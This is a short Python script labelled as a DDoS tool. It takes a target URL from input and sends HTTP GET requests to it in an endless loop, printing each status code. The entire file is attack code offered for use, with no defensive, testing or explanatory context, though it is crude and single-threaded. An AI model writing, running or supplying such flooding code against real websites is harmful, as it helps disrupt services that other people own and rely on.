#DDos IN Python
import requests # type: ignore

target = input()

while True:
    r = requests.get(target)

    print(r.status_code)

 